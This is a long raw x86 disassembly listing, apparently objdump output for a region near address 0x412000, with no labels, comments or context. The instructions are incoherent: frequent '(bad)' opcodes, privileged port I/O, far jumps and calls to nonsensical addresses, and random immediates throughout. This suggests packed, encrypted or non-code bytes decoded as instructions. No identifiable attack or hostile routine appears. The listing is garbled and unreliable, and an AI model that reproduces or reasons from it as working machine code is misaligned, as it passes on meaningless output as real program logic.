  411d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d9c:	mov    al,ds:0xf058eccb
  411da1:	test   al,0xc1
  411da3:	shl    bh,0x2c
  411da6:	aas    
  411da7:	sbb    BYTE PTR [eax-0x671b90bb],dh
  411dad:	sub    eax,0xe09221ce
  411db2:	lahf   
  411db3:	push   0x9d6990bf
  411db8:	(bad)  
  411db9:	xchg   DWORD PTR cs:[esi+ecx*1+0x1c53a50d],esi
  411dc1:	cwde   
  411dc2:	hlt    
  411dc3:	mov    BYTE PTR [ebx+0x53d7e214],bh
  411dc9:	leave  
  411dca:	push   cs
  411dcb:	aas    
  411dcc:	push   esi
  411dcd:	xor    DWORD PTR [esi+edx*1-0x24],ebx
  411dd1:	cmc    
  411dd2:	add    bh,bh
  411dd4:	pop    es
  411dd5:	adc    dh,bl
  411dd7:	jns    0x411d7e
  411dd9:	into   
  411dda:	and    eax,DWORD PTR [ebp-0x22a37e9f]
  411de0:	in     al,0xd2
  411de2:	test   DWORD PTR [ebx+0x38],0xaeb6765
  411de9:	jmp    FWORD PTR [edx-0x45c25a4b]
  411def:	xchg   esi,eax
  411df0:	test   eax,0xd92297ae
  411df5:	mov    ecx,0x51632bd7
  411dfa:	xor    bh,BYTE PTR [esi]
  411dfc:	fwait
  411dfd:	lahf   
  411dfe:	ja     0x411e4f
  411e00:	push   es
  411e01:	push   0x3b
  411e03:	pop    ebp
  411e04:	nop
  411e05:	and    al,0x9e
  411e07:	rol    bh,0x50
  411e0a:	dec    ebp
  411e0b:	fist   DWORD PTR [ebx-0x33185799]
  411e11:	(bad)  
  411e12:	pop    edx
  411e13:	ror    BYTE PTR [ecx],cl
  411e15:	dec    edx
  411e16:	inc    ecx
  411e17:	rcr    BYTE PTR [edi],1
  411e19:	clc    
  411e1a:	mov    ds:0x40a273a3,eax
  411e1f:	test   eax,0x9a2d8cf6
  411e24:	mov    BYTE PTR [edi+0x182854d2],cl
  411e2a:	xor    eax,0x2347fb61
  411e2f:	in     eax,0xa
  411e31:	add    ebx,DWORD PTR [edi+0x3b]
  411e34:	sbb    edi,edi
  411e36:	inc    ecx
  411e37:	adc    eax,0x63cad5a7
  411e3c:	dec    ecx
  411e3d:	js     0x411e5b
  411e3f:	sbb    DWORD PTR [ecx+0x53],esi
  411e42:	nop
  411e43:	pop    ebx
  411e44:	rol    DWORD PTR [esi+eiz*4-0x7],1
  411e48:	pop    eax
  411e49:	in     eax,dx
  411e4a:	fcmovnu st,st(0)
  411e4c:	(bad)  
  411e4d:	dec    esi
  411e4e:	or     al,0xf6
  411e50:	loopne 0x411e2b
  411e52:	ins    DWORD PTR es:[edi],dx
  411e53:	inc    esi
  411e54:	test   eax,esp
  411e56:	(bad)  
  411e57:	xabort 0x53
  411e5a:	and    al,0x53
  411e5c:	sub    eax,DWORD PTR [eax]
  411e5e:	and    BYTE PTR [ecx-0x6657d6cd],al
  411e64:	fnstsw WORD PTR [bx+di]
  411e67:	xchg   esi,eax
  411e68:	retf   
  411e69:	mov    ebx,0x9b11f90f
  411e6e:	addr16 into 
  411e70:	test   eax,0xdc5c9f8b
  411e75:	mov    dh,0x26
  411e77:	mov    dl,0x12
  411e79:	hlt    
  411e7a:	mov    ch,0x10
  411e7c:	not    DWORD PTR [esi-0x5db28a78]
  411e82:	ins    BYTE PTR es:[edi],dx
  411e83:	loope  0x411e18
  411e85:	and    al,0x9f
  411e87:	jae    0x411e75
  411e89:	cmp    dl,cl
  411e8b:	retf   0x64a6
  411e8e:	jecxz  0x411e6d
  411e90:	xchg   edx,eax
  411e91:	pusha  
  411e92:	out    dx,al
  411e93:	shr    DWORD PTR [esi-0x23],cl
  411e96:	jmp    0x69400af9
  411e9b:	push   0xffffffa9
  411e9d:	imul   edi,ecx,0xffffff9a
  411ea0:	loope  0x411e4f
  411ea2:	(bad)  
  411ea3:	pushf  
  411ea4:	mov    ecx,0x8c0bdfd7
  411ea9:	in     eax,dx
  411eaa:	push   es
  411eab:	jbe    0x411e4f
  411ead:	sbb    al,0x5b
  411eaf:	add    al,0x6f
  411eb1:	fldl2t 
  411eb3:	fsub   QWORD PTR [eax+0x5d]
  411eb6:	xchg   edx,eax
  411eb7:	and    ebp,edx
  411eb9:	in     eax,0xa0
  411ebb:	sbb    bh,al
  411ebd:	int3   
  411ebe:	mov    ch,0x9b
  411ec1:	jle    0x411f38
  411ec3:	fstp   DWORD PTR [edx-0x5c]
  411ec6:	inc    eax
  411ec7:	ret    0x9dad
  411eca:	aam    0xf4
  411ecc:	xor    edx,DWORD PTR [edi+0x2d58ddd6]
  411ed2:	jmp    0x411f3c
  411ed4:	lods   eax,DWORD PTR ds:[esi]
  411ed5:	(bad)  [edi-0x18]
  411ed8:	dec    edx
  411ed9:	jno    0x411ecc
  411edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411edc:	sti    
  411edd:	or     eax,0x879278d
  411ee2:	je     0x411e76
  411ee4:	pusha  
  411ee5:	arpl   bp,dx
  411ee7:	cs jbe 0x411e8b
  411eea:	sahf   
  411eeb:	sar    BYTE PTR [ebp+ebx*8+0x2b9c3e67],1
  411ef2:	sub    dl,dh
  411ef4:	enter  0x5c75,0x93
  411ef8:	sub    BYTE PTR [ecx],0x44
  411efb:	mov    WORD PTR [ecx+0x36],fs
  411efe:	jp     0x411f2d
  411f00:	adc    BYTE PTR [edx],cl
  411f02:	push   es
  411f03:	fcomp  QWORD PTR [esi-0x3b]
  411f06:	cs cmc 
  411f08:	push   0xe81e50ca
  411f0d:	sub    edi,edi
  411f0f:	push   eax
  411f10:	cld    
  411f11:	fcom   DWORD PTR [esi+0x32108bc2]
  411f17:	xor    edi,DWORD PTR [ebx-0x5f28d51c]
  411f1d:	inc    esp
  411f1e:	adc    esi,esp
  411f20:	cdq    
  411f21:	adc    ch,BYTE PTR [edi]
  411f23:	xor    BYTE PTR [eax-0x3aff71d4],ah
  411f29:	sbb    DWORD PTR [ecx+0xe],esp
  411f2c:	(bad)  
  411f2d:	pop    ecx
  411f2e:	xor    ebx,DWORD PTR cs:[ebp+0x1675d897]
  411f35:	stos   DWORD PTR es:[edi],eax
  411f36:	add    cl,dh
  411f38:	pop    ecx
  411f39:	sub    esp,DWORD PTR [ecx+ecx*1+0x4a]
  411f3d:	sbb    eax,0xa231009c
  411f42:	dec    eax
  411f43:	popa   
  411f44:	enter  0x1e37,0xe1
  411f48:	nop
  411f49:	enter  0x2c77,0x32
  411f4d:	mov    ebp,0xbd242c16
  411f52:	mov    eax,DWORD PTR [esi-0x19]
  411f55:	mov    esp,0xacf4b3bd
  411f5a:	jg     0x411f65
  411f5c:	push   ebp
  411f5d:	in     eax,0x9f
  411f5f:	fs push 0x38
  411f62:	push   ecx
  411f63:	imul   BYTE PTR [ebx+0x5ce4cfc3]
  411f69:	xchg   edi,eax
  411f6a:	xor    esp,DWORD PTR [edx+0x63aa4689]
  411f70:	outs   dx,DWORD PTR ds:[esi]
  411f71:	(bad)  
  411f73:	xlat   BYTE PTR ds:[ebx]
  411f74:	in     eax,dx
  411f75:	mov    bh,0x50
  411f77:	mov    cl,0x5e
  411f79:	fcomp  QWORD PTR [ebx-0x58]
  411f7c:	sbb    DWORD PTR [ecx+eax*8],ebx
  411f7f:	push   cs
  411f80:	clc    
  411f81:	(bad)  
  411f82:	jecxz  0x411fa3
  411f84:	repz inc ebx
  411f86:	xor    ebx,DWORD PTR [edi-0x3e5b84f6]
  411f8c:	test   eax,0x5f28e740
  411f91:	or     DWORD PTR [ebx-0xc9d6a47],eax
  411f97:	cmp    edi,ebp
  411f99:	es icebp 
  411f9b:	mov    ch,0x11
  411f9d:	outs   dx,BYTE PTR ds:[esi]
  411f9e:	sahf   
  411f9f:	jns    0x411fde
  411fa1:	pop    esp
  411fa2:	imul   eax,DWORD PTR [edi],0xffffffa1
  411fa5:	pop    ss
  411fa6:	bound  ebp,QWORD PTR [esi]
  411fa8:	sar    BYTE PTR [esi+eax*4-0x51],0x30
  411fad:	inc    ebp
  411fae:	sahf   
  411faf:	jb     0x412001
  411fb1:	adc    al,BYTE PTR ds:0xeb9fe5f6
  411fb7:	adc    BYTE PTR [ebx-0x20],ch
  411fba:	aaa    
  411fbb:	sbb    BYTE PTR [ecx+0x7ef003e1],0x17
  411fc2:	adc    bl,ah
  411fc4:	ror    DWORD PTR [edi-0x79],1
  411fc7:	fiadd  DWORD PTR [ebx+0x16]
  411fca:	adc    DWORD PTR [esi+0x7],eax
  411fcd:	js     0x412013
  411fcf:	popf   
  411fd0:	stos   DWORD PTR es:[edi],eax
  411fd1:	lock cmp al,0x8e
  411fd4:	loopne 0x412026
  411fd6:	and    eax,0x99deb3cc
  411fdb:	cmp    eax,0x9f834db8
  411fe0:	xchg   ebx,eax
  411fe1:	clc    
  411fe2:	lds    ebp,FWORD PTR [ebp-0x8]
  411fe5:	sub    dh,BYTE PTR [edi-0x67]
  411fe8:	jmp    0x412025
  411fea:	lahf   
  411feb:	(bad)  
  411fed:	sbb    BYTE PTR [esi],0x10
  411ff0:	lods   eax,DWORD PTR ds:[esi]
  411ff1:	retf   0x41e8
  411ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ff5:	test   ebp,ecx
  411ff7:	adc    eax,0x26caf990
  411ffc:	ficom  DWORD PTR [edx-0x16]
  411fff:	cld    
  412000:	ficomp WORD PTR [edi+0x6f]
  412003:	mov    al,0x1f
  412005:	mov    dh,0x78
  412007:	and    ch,BYTE PTR [edi+0xa]
  41200a:	mov    ah,0x65
  41200c:	jbe    0x412029
  41200e:	dec    edi
  41200f:	adc    edi,DWORD PTR [edx+0x48dd53f7]
  412015:	push   es
  412016:	xchg   ecx,eax
  412017:	ret    
  412018:	ret    
  412019:	pop    es
  41201a:	push   cs
  41201b:	lock xchg esp,eax
  41201d:	or     eax,0xd535151c
  412022:	or     BYTE PTR [edi-0x6c],cl
  412025:	cmp    BYTE PTR [ecx+0x18],bh
  412028:	push   cs
  412029:	adc    DWORD PTR [ecx+edi*4+0x4f],esp
  41202d:	aas    
  41202e:	or     eax,0x93c6035a
  412033:	jmp    0xabc5f42b
  412038:	stos   DWORD PTR es:[edi],eax
  412039:	clc    
  41203a:	fbstp  TBYTE PTR [ebp-0x2a]
  41203d:	repz inc ebx
  41203f:	xchg   ecx,eax
  412040:	shr    ebp,0xe8
  412043:	scas   al,BYTE PTR es:[edi]
  412044:	sub    eax,0x11cb3227
  412049:	int3   
  41204a:	mov    dh,0x66
  41204c:	clc    
  41204d:	lahf   
  41204e:	leave  
  41204f:	pop    ss
  412050:	pop    ebp
  412051:	mov    ds:0x8f929b82,eax
  412056:	test   eax,0xea981f28
  41205b:	xlat   BYTE PTR ds:[ebx]
  41205c:	add    eax,0x56c0a7d0
  412061:	dec    ecx
  412062:	pusha  
  412063:	mov    cl,0x6
  412065:	cdq    
  412066:	call   0x149:0x9ce167cd
  41206d:	cmp    al,0x9b
  41206f:	fwait
  412070:	aad    0xb5
  412072:	pop    edi
  412073:	sub    eax,0xfab826de
  412078:	cwde   
  412079:	ret    
  41207a:	push   ss
  41207b:	push   es
  41207c:	aad    0x3f
  41207e:	retf   0xf2cd
  412081:	push   ds
  412082:	mov    dh,0x75
  412084:	lahf   
  412085:	pusha  
  412086:	hlt    
  412087:	rcr    BYTE PTR [edi],0x60
  41208a:	dec    esp
  41208b:	pop    es
  41208c:	bound  edx,QWORD PTR [ebp+0x15]
  41208f:	mov    DWORD PTR [edx+0xc262b62],edi
  412095:	cld    
  412096:	mov    bh,0xd4
  412098:	test   DWORD PTR [edi],edi
  41209a:	mov    eax,ds:0x486da6cd
  41209f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120a0:	mov    ds:0xd187b03b,eax
  4120a5:	jmp    0x4125b0
  4120aa:	cmp    al,0x3f
  4120ac:	mov    al,0xc9
  4120af:	(bad)
  4120b2:	cmc    
  4120b3:	add    esi,esp
  4120b5:	inc    edx
  4120b6:	add    eax,0xc2619e9f
  4120bb:	add    edi,DWORD PTR [edi+0x78]
  4120be:	push   0x7c
  4120c0:	js     0x41213a
  4120c2:	dec    esp
  4120c3:	push   edx
  4120c4:	fwait
  4120c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120c6:	pusha  
  4120c7:	in     al,dx
  4120c8:	or     BYTE PTR [ecx+0x3f3dfaff],bl
  4120ce:	dec    edx
  4120cf:	test   eax,ecx
  4120d1:	mov    eax,ds:0xf50611d7
  4120d6:	mov    eax,ds:0xdc58f93d
  4120db:	mov    esp,0xa5459e0e
  4120e0:	cmp    DWORD PTR [ebx+0x6000f6a0],edx
  4120e6:	mov    gs,WORD PTR [eax]
  4120e8:	xchg   BYTE PTR [esi+edx*2-0x6524abbb],bl
  4120ef:	mov    ch,0xd1
  4120f1:	cmp    edi,DWORD PTR [edi+0x6256d65f]
  4120f7:	pop    DWORD PTR [esi+0x6bd592ad]
  4120fd:	stc    
  4120fe:	pushf  
  4120ff:	push   ss
  412100:	inc    esi
  412101:	sar    bh,cl
  412103:	xchg   edi,eax
  412104:	push   0x2
  412106:	mov    esp,0x200da505
  41210b:	inc    esi
  41210c:	add    al,0xfa
  41210e:	fs in  eax,0x85
  412111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412112:	jle    0x412151
  412114:	cmc    
  412115:	push   ecx
  412116:	mov    BYTE PTR [esp+ecx*8+0x168c26be],ch
  41211d:	push   ds
  41211e:	fsub   QWORD PTR [ebp+0x37628442]
  412124:	scas   al,BYTE PTR es:[edi]
  412125:	jne    0x412145
  412127:	addr16 mov edx,0xf87391c6
  41212d:	in     eax,dx
  41212e:	and    dl,0x3f
  412131:	jmp    0x4120e7
  412133:	int3   
  412134:	loope  0x412172
  412136:	retfw  
  412138:	mov    esp,esi
  41213a:	pop    es
  41213b:	stos   DWORD PTR es:[edi],eax
  41213c:	jns    0x412164
  41213e:	mov    DWORD PTR [ebp+0x318c007a],ebp
  412144:	mov    WORD PTR [ecx-0x64],gs
  412147:	xor    BYTE PTR [edi+0x3247cea0],al
  41214d:	popa   
  41214e:	jmp    0xe9a010c1
  412153:	jecxz  0x412138
  412155:	xchg   ebx,eax
  412156:	dec    eax
  412157:	cmp    BYTE PTR [edi+0x6efde80f],ch
  41215d:	jmp    0x412110
  41215f:	adc    al,0xe9
  412161:	dec    eax
  412162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412163:	aaa    
  412164:	les    edx,FWORD PTR [eax+esi*2]
  412167:	push   ds
  412168:	xor    al,0x5b
  41216a:	retf   0x4f8e
  41216d:	out    dx,eax
  41216e:	(bad)  
  412170:	mov    ds:0x34d9b0ff,al
  412175:	fbld   TBYTE PTR [ebx-0x264e3bbf]
  41217b:	jae    0x41213f
  41217d:	mov    eax,DWORD PTR [ebp-0x1a0918ef]
  412183:	push   ecx
  412184:	(bad)  
  412185:	stc    
  412186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412187:	lods   al,BYTE PTR ds:[esi]
  412188:	iret   
  412189:	out    dx,al
  41218a:	pop    eax
  41218b:	mov    ecx,0x11bf7a00
  412190:	mov    ebp,0xc0f97b4a
  412195:	sub    bl,BYTE PTR [esi+0x58]
  412198:	adc    BYTE PTR [ebx+0x44],cl
  41219b:	mov    ecx,gs
  41219d:	push   edx
  41219e:	fild   QWORD PTR [ecx-0x79]
  4121a1:	mov    esp,0x6a65187f
  4121a6:	loop   0x4121d2
  4121a8:	fs into 
  4121aa:	pop    ebp
  4121ab:	jns    0x412216
  4121ad:	inc    eax
  4121ae:	in     eax,dx
  4121af:	ds int 0xed
  4121b2:	jmp    0xba28:0xcccd771d
  4121b9:	mov    cl,0xfb
  4121bb:	push   cs
  4121bc:	add    dh,ch
  4121be:	mov    edi,0xb32bbda9
  4121c3:	push   0xd25dc8f7
  4121c8:	mov    eax,0x7fb78a94
  4121cd:	mov    ss,WORD PTR [eax-0x2c]
  4121d0:	test   ebp,0x244c8865
  4121d6:	sbb    esp,eax
  4121d8:	xor    eax,0x595f1848
  4121dd:	sub    al,0x75
  4121df:	sahf   
  4121e0:	sbb    al,0xe5
  4121e2:	dec    ebp
  4121e3:	xor    ebx,esi
  4121e5:	hlt    
  4121e6:	mov    es,WORD PTR [edi+0x30a071cd]
  4121ec:	fadd   DWORD PTR [eax]
  4121ee:	ins    BYTE PTR es:[edi],dx
  4121ef:	xor    eax,0xd2e296a9
  4121f4:	jl     0x4121a6
  4121f6:	cmp    eax,0xd86c4f6c
  4121fb:	dec    esp
  4121fc:	repnz mov ebp,0xb5cb4d1a
  412202:	out    0x2e,eax
  412204:	mov    ecx,0x6fefec00
  412209:	and    eax,0x4792fc8f
  41220e:	call   0x3a9b0d71
  412213:	rol    BYTE PTR [edx+eiz*4],0x19
  412217:	jecxz  0x41228f
  412219:	mov    al,0x64
  41221b:	pushf  
  41221c:	out    0x25,al
  41221e:	xchg   edx,eax
  41221f:	dec    ebx
  412220:	mov    al,0x13
  412222:	je     0x4121d2
  412224:	cmp    eax,0x9a8729b3
  412229:	and    al,0xd1
  41222b:	aaa    
  41222c:	jmp    0x732d92dd
  412231:	scas   eax,DWORD PTR es:[edi]
  412232:	stos   DWORD PTR es:[edi],eax
  412233:	imul   esp,edx,0xffffffd2
  412236:	inc    esi
  412237:	jns    0x41225e
  412239:	jmp    0x4122ae
  41223b:	add    DWORD PTR [ebx+0x2a],esp
  41223e:	scas   al,BYTE PTR es:[edi]
  41223f:	cli    
  412240:	mov    BYTE PTR [eax],al
  412242:	mov    dh,0xf
  412244:	rcl    BYTE PTR [ebx],0x84
  412247:	test   BYTE PTR [esi-0x1e],dl
  41224a:	out    dx,eax
  41224b:	loope  0x4122c9
  41224d:	stos   BYTE PTR es:[edi],al
  41224e:	ret    
  41224f:	mov    al,ds:0xed37f65c
  412254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412255:	sahf   
  412256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412257:	leave  
  412258:	jne    0x412289
  41225a:	sahf   
  41225b:	or     dh,BYTE PTR [edi-0x3731ad11]
  412261:	and    bl,cl
  412263:	jecxz  0x4121ff
  412265:	in     eax,dx
  412266:	es push ecx
  412268:	inc    eax
  412269:	xchg   ecx,eax
  41226a:	sub    BYTE PTR [esi+0x19],dh
  41226d:	cmp    DWORD PTR [edx],eax
  41226f:	pop    edx
  412270:	add    al,0x4c
  412272:	test   al,0x10
  412274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412275:	les    esp,FWORD PTR [ecx]
  412277:	call   0x368eba7b
  41227c:	xchg   DWORD PTR [esi-0x29d6bc18],ebx
  412282:	lahf   
  412283:	mov    ds:0xd4070354,al
  412288:	js     0x4122b4
  41228a:	ror    DWORD PTR [ecx-0x15b4a9da],1
  412290:	mov    edx,0x6763a1ce
  412295:	scas   al,BYTE PTR es:[edi]
  412296:	add    dl,BYTE PTR [ebx-0x5]
  412299:	mov    ah,0xbb
  41229b:	xor    ebx,esp
  41229d:	sar    DWORD PTR ds:0x24f94876,0x8a
  4122a4:	cmp    DWORD PTR [edx+eax*8+0x2f],edx
  4122a8:	mov    cl,0xae
  4122aa:	fimul  WORD PTR [esi+0x773a3589]
  4122b0:	dec    edx
  4122b1:	add    DWORD PTR [ebx-0x57],eax
  4122b4:	push   esi
  4122b5:	ret    0x7dc1
  4122b8:	(bad)  
  4122b9:	xor    eax,0x79e30f72
  4122be:	popf   
  4122bf:	and    eax,0x866cdb2a
  4122c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122c5:	fsubr  QWORD PTR [esi+0x4f785ad8]
  4122cb:	jbe    0x4122af
  4122cd:	imul   ecx,DWORD PTR [ebx-0x198398a3],0x1705f0e0
  4122d7:	mov    BYTE PTR ds:0x86d2ff47,ch
  4122dd:	(bad)  
  4122de:	jle    0x4122fc
  4122e0:	xlat   BYTE PTR ds:[ebx]
  4122e1:	xor    BYTE PTR [esp+esi*8+0x66],cl
  4122e5:	mov    ebx,0x541c29d5
  4122ea:	stos   BYTE PTR es:[edi],al
  4122eb:	int    0xab
  4122ed:	mov    BYTE PTR [eax-0x57],bl
  4122f0:	jge    0x412344
  4122f2:	push   es
  4122f3:	dec    ebp
  4122f4:	adc    esp,DWORD PTR [edi+ecx*4-0x5b]
  4122f8:	pop    ds
  4122f9:	das    
  4122fa:	inc    ebx
  4122fb:	sbb    DWORD PTR [eax+eiz*8-0x4b],edx
  4122ff:	inc    si
  412301:	stos   DWORD PTR es:[edi],eax
  412302:	into   
  412303:	jmp    0x4122e0
  412305:	sbb    DWORD PTR [esi],esi
  412307:	or     eax,0xd18526f8
  41230c:	sub    eax,DWORD PTR [eax-0x2d]
  41230f:	pop    eax
  412310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412311:	and    bl,0x5e
  412314:	pop    edi
  412315:	mov    dh,0xd4
  412317:	cmp    ah,BYTE PTR [edx-0x3af7bff3]
  41231d:	aam    0x8c
  41231f:	xor    bh,BYTE PTR [edx+0x37]
  412322:	sbb    edi,ebx
  412324:	je     0x41236f
  412326:	xor    ecx,DWORD PTR [ebp+0x14b2e8bf]
  41232c:	add    DWORD PTR [ebp-0x7a],ebx
  41232f:	or     al,0x41
  412331:	inc    ebp
  412332:	jecxz  0x4122e8
  412334:	mov    es,WORD PTR [esi]
  412336:	out    dx,al
  412337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412338:	jmp    0x4122df
  41233a:	cmp    edi,DWORD PTR [edi-0x6d93a040]
  412340:	ret    
  412341:	xchg   ecx,eax
  412342:	(bad)  
  412343:	imul   edx,eax,0xffffff9e
  412346:	nop
  412347:	icebp  
  412348:	push   ebp
  412349:	sbb    al,0x13
  41234b:	fiadd  DWORD PTR [ebx+0x70]
  41234e:	pop    esi
  41234f:	ins    BYTE PTR es:[edi],dx
  412350:	mov    bl,0x85
  412352:	jmp    0x638e:0xea59ec01
  412359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41235a:	sub    al,0x57
  41235c:	cs mov esi,0x3de088b0
  412362:	stc    
  412363:	mov    eax,DWORD PTR [esi]
  412365:	dec    ebx
  412366:	loop   0x4123d9
  412368:	or     BYTE PTR [eax],bh
  41236a:	shr    DWORD PTR [esi],cl
  41236c:	addr16 jmp 0x83710780
  412372:	stc    
  412373:	inc    eax
  412374:	xor    BYTE PTR [edi-0x14],bh
  412377:	cmp    BYTE PTR [edi],dl
  412379:	mov    fs,WORD PTR [ebp+0x7a78b273]
  41237f:	test   BYTE PTR [ecx+0x40],bh
  412382:	mov    ds:0x381a9530,al
  412387:	or     DWORD PTR [edi+0x53],esi
  41238a:	pop    ebp
  41238b:	or     esp,0x85b7237b
  412391:	push   0x1a2234d6
  412396:	leave  
  412397:	dec    esi
  412398:	leave  
  412399:	or     dl,BYTE PTR [edi+0x339dc9eb]
  41239f:	xchg   ebx,eax
  4123a0:	enter  0x8023,0xd3
  4123a4:	ds popf 
  4123a6:	sub    BYTE PTR [esp+edi*1],bl
  4123a9:	fidivr WORD PTR [edx]
  4123ab:	loop   0x41240b
  4123ad:	add    dh,cl
  4123af:	push   edi
  4123b0:	es push edi
  4123b2:	mov    al,ds:0x26d0f2fc
  4123b7:	ss sbb ebp,ebx
  4123ba:	imul   esp,DWORD PTR [ebx],0xffffffbf
  4123bd:	stos   DWORD PTR es:[edi],eax
  4123be:	in     al,dx
  4123bf:	(bad)  
  4123c0:	mov    ecx,0xc60e188e
  4123c5:	fist   WORD PTR [ebp+eax*1-0x1af1a8b6]
  4123cc:	or     esp,DWORD PTR [eax]
  4123ce:	fcom   QWORD PTR [esi+0x3f]
  4123d1:	mov    ebp,0xfdb8ef55
  4123d6:	pop    ebx
  4123d7:	inc    esp
  4123d8:	pop    edx
  4123d9:	jnp    0x4123ff
  4123db:	dec    ebp
  4123dc:	mov    ebx,DWORD PTR [esi-0x77]
  4123df:	lods   eax,DWORD PTR ds:[esi]
  4123e0:	rcl    BYTE PTR [ecx],1
  4123e2:	in     eax,0xbb
  4123e4:	and    eax,esp
  4123e6:	lahf   
  4123e7:	out    dx,eax
  4123e8:	jns    0x412454
  4123ea:	cmp    ah,BYTE PTR [edx-0x7eca36df]
  4123f0:	xor    ch,BYTE PTR [ecx+0x60027a54]
  4123f6:	and    ecx,eax
  4123f8:	es push 0xffffff9c
  4123fb:	int    0xb1
  4123fd:	push   edi
  4123fe:	ins    DWORD PTR es:[edi],dx
  4123ff:	pusha  
  412400:	jnp    0x4123b8
  412402:	jns    0x412451
  412404:	adc    bl,BYTE PTR [esi]
  412406:	icebp  
  412407:	scas   eax,DWORD PTR es:[edi]
  412408:	adc    DWORD PTR [esi+0x5eec6f2f],0xffffffa8
  41240f:	dec    edx
  412410:	pop    DWORD PTR [edx+0x7c]
  412413:	pop    eax
  412414:	xchg   DWORD PTR [edx+0x72],esi
  412417:	sti    
  412418:	xor    al,0x82
  41241a:	int3   
  41241b:	(bad)  
  41241c:	jnp    0x4123f6
  41241e:	mov    DWORD PTR [eax],edi
  412420:	mov    ch,0x18
  412422:	mov    BYTE PTR [esi+ebx*4-0x1f],dl
  412426:	pop    esp
  412427:	mov    ds:0xdcfe293c,al
  41242c:	ds pusha 
  41242e:	xchg   ebp,eax
  41242f:	sbb    eax,0xfb44a18c
  412434:	in     al,dx
  412435:	jmp    0x4123e0
  412437:	mov    al,0x48
  412439:	mov    ecx,esp
  41243b:	and    BYTE PTR [esi+0x60de1b3d],dh
  412441:	sub    ah,cl
  412443:	sbb    ch,0xba
  412446:	je     0x41245a
  412448:	add    ch,BYTE PTR [eax-0x29]
  41244b:	daa    
  41244c:	call   0xca193d95
  412451:	mov    edx,0x70e4bd9a
  412456:	retf   0x7c05
  412459:	aas    
  41245a:	rol    BYTE PTR ds:0x4937627a,0xf0
  412461:	mov    eax,0xa03bf8b5
  412466:	xor    al,0xf
  412468:	stc    
  412469:	hlt    
  41246a:	jns    0x4124e1
  41246c:	pusha  
  41246d:	xchg   edx,eax
  41246e:	lahf   
  41246f:	adc    ch,ch
  412471:	or     al,0x5
  412473:	xchg   esi,eax
  412474:	std    
  412475:	xor    al,0x17
  412477:	dec    ebp
  412478:	sub    eax,0x8afd9b99
  41247d:	mov    edi,0x7da7320
  412482:	loop   0x4124f8
  412484:	adc    edi,DWORD PTR [edx-0x2a]
  412487:	call   0x8abbb62d
  41248c:	jmp    0xb671c43a
  412491:	pop    ebp
  412492:	clc    
  412493:	mov    ah,0x79
  412495:	stos   DWORD PTR es:[edi],eax
  412496:	inc    edx
  412497:	nop
  412498:	in     al,0xc4
  41249a:	xor    eax,0xad3f400
  41249f:	hlt    
  4124a0:	sub    DWORD PTR [ebp+esi*1+0x3d],esi
  4124a4:	mov    eax,0x23a4fbe1
  4124a9:	adc    bl,BYTE PTR [esi+0x67c81639]
  4124af:	push   0xaf4e0371
  4124b4:	mov    al,ds:0xa6dd01ee
  4124b9:	into   
  4124ba:	xchg   ecx,esi
  4124bc:	mov    bl,0xee
  4124be:	push   esi
  4124bf:	arpl   WORD PTR [esi+0x1b38f844],si
  4124c5:	mov    al,0xb4
  4124c7:	in     al,dx
  4124c8:	in     eax,0x99
  4124ca:	rol    DWORD PTR [ebx-0x33],0x64
  4124ce:	fs int3 
  4124d0:	lahf   
  4124d1:	push   0x7f76caaf
  4124d6:	xchg   BYTE PTR ds:0x4406f8ab,dh
  4124dc:	loopne 0x4124f1
  4124de:	lahf   
  4124df:	cld    
  4124e0:	push   edx
  4124e1:	mov    esi,0xd281b663
  4124e6:	sub    esi,DWORD PTR [ecx+0x11]
  4124e9:	ins    DWORD PTR es:[edi],dx
  4124ea:	pop    ebx
  4124eb:	das    
  4124ec:	sbb    al,0xe2
  4124ee:	pop    edi
  4124ef:	inc    ebp
  4124f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124f1:	sub    DWORD PTR [edi+0xa],esp
  4124f4:	rcr    ebp,1
  4124f6:	jne    0x412490
  4124f8:	mov    bh,0xbf
  4124fa:	sbb    DWORD PTR [edx+0x60],ebp
  4124fd:	call   0xd887c0f0
  412502:	(bad)
  412506:	pop    es
  412507:	jo     0x4124b1
  412509:	mov    edx,0xf7c686a3
  41250e:	mov    ah,0x55
  412510:	repnz mov al,BYTE PTR [ecx+0x3bcfae36]
  412517:	dec    ecx
  412518:	imul   esp,DWORD PTR [ebx+eiz*4+0x29],0x115096fd
  412520:	push   0x52e26a6e
  412525:	xor    ah,BYTE PTR [ebp+ebx*2-0x4e03cf81]
  41252c:	pop    esi
  41252d:	in     al,0x42
  41252f:	jne    0x41257a
  412531:	or     al,0x54
  412533:	ins    DWORD PTR es:[edi],dx
  412534:	add    ebx,ecx
  412536:	ins    BYTE PTR es:[edi],dx
  412537:	in     eax,0x21
  412539:	inc    ecx
  41253a:	sub    al,0xee
  41253c:	sub    DWORD PTR [esi+eax*4],edx
  41253f:	sbb    al,0x4a
  412541:	mov    WORD PTR [ecx-0xc],?
  412544:	cmp    edi,esp
  412546:	sub    al,0x78
  412548:	cmp    ebx,edx
  41254a:	jmp    0xe13c9956
  41254f:	sbb    BYTE PTR [esi-0x80],al
  412552:	int    0x87
  412554:	arpl   WORD PTR [ecx-0x5d],cx
  412557:	or     ah,ah
  412559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41255a:	push   ds
  41255b:	or     BYTE PTR [ebp-0x7b2616c3],dh
  412561:	dec    esp
  412562:	push   esi
  412563:	sub    eax,0x5ae5df53
  412568:	test   al,0xb7
  41256a:	call   0x15e5:0x673a317c
  412571:	sbb    al,0x4a
  412573:	mov    ebx,0x768c0cf0
